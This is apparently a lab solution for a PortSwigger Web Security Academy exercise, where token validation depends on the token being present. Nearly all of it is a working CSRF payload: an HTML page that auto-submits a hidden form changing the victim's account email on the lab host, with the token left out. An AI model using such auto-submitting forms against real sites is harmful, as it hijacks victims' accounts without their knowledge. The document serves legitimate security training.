# Lab

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

## Payload


```html
<html>
    <body>
        <script>
            history.pushState('', '', '/');
        </script>
        <form action="https://0ac600f00406842a825c078200170062.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@sa.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```